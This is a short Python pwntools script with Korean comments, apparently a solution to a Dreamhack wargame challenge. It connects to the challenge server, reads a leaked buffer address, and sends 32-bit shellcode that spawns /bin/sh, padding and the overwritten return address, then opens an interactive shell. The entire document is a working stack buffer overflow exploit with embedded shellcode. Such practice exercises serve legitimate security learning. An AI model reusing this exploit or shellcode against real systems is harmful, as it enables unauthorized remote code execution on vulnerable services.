from pwn import *

p = remote("host3.dreamhack.games", 21059)

p.recvuntil("buf = (")

buf_address = int(p.recv(10), 16)

# 셸코드를 바이트 문자열로 선언
code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

# 패딩 추가
code += b"\x80" * 106

# buf_address를 리틀 엔디안 형식으로 추가
code += p32(buf_address)

p.sendline(code)
p.interactive()
